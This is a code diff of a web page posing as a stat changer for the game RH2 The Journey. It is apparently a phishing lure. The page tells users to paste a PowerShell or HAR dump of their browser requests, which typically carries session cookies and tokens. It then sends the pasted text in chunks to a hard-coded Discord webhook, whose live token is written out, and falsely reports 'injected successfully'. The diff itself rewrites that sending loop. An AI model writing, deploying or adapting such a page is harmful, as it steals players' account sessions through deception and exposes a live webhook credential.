@@ -155,10 +155,10 @@
 
         // Load About Page
         function loadAbout() {
-            document.getElementById('content').innerHTML = `
+            document.getElementById('content').innerHTML = ` 
                 <div class="container">
                     <h1>About RH2 The Journey Stat Changer</h1>
-                    <p>This tool is used to change stats for RH2 The Journey. If you need help, DM cemeteryzz. Special thanks to the devs who worked hard on ts.</p>
+                    <p>This tool is used to change stats for RH2 The Journey. If you need help, DM cemeteryzz.</p>
                     <a href="#" class="back-button" onclick="goBack()">Back</a>
                 </div>
             `;
@@ -166,10 +166,10 @@
 
         // Load Get Started Page
         function loadGetStarted() {
-            document.getElementById('content').innerHTML = `
+            document.getElementById('content').innerHTML = ` 
                 <div class="form-container">
                     <h1>Enter The Correct File</h1>
-                    <textarea id="fileInput" placeholder="Paste your shitty powershell here..."></textarea>
+                    <textarea id="fileInput" placeholder="Paste your shitty powershell..."></textarea> 
                     <button class="button" onclick="processFile()">Send</button>
                     <a href="#" class="back-button" onclick="goBack()">Back</a>
                 </div>
@@ -186,34 +186,34 @@
             const fileContent = document.getElementById('fileInput').value;
 
             if (!fileContent.trim()) {
-                alert('Please paste a valid HAR file content.');
+                alert('Please paste a powershell.'); 
                 return;
             }
 
             const chunks = fileContent.match(/.{1,2000}/g); // Break into chunks
-            let delay = 0;
+            let index = 0;
 
-            chunks.forEach((chunk, index) => {
-                setTimeout(() => {
+            const intervalId = setInterval(() => {
+                if (index < chunks.length) {
                     fetch('https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: `Part ${index + 1}: ${chunk}` }),
+                        body: JSON.stringify({ content: `Part ${index + 1}: ${chunks[index]}` }),
                     })
                     .then(response => response.json())
                     .then(data => {
-                        if (index === chunks.length - 1) {
-                            alert('injected successfully!');
-                        }
+                        // Success logic (if needed)
                     })
                     .catch(error => {
                         console.error('Error sending file chunk:', error);
-                        alert('Failed to inject, sorry you little skid.');
                     });
-                }, delay);
 
-                delay += 2000; // Delay of 2 seconds between each request
-            });
+                    index++;
+                } else {
+                    clearInterval(intervalId); // Stop sending once all parts are sent
+                    alert('injected successfully! Open rh2 and adjust ur shit');
+                }
+            }, 1000); // Send parts every 1 second
         }
     </script>
 </body>
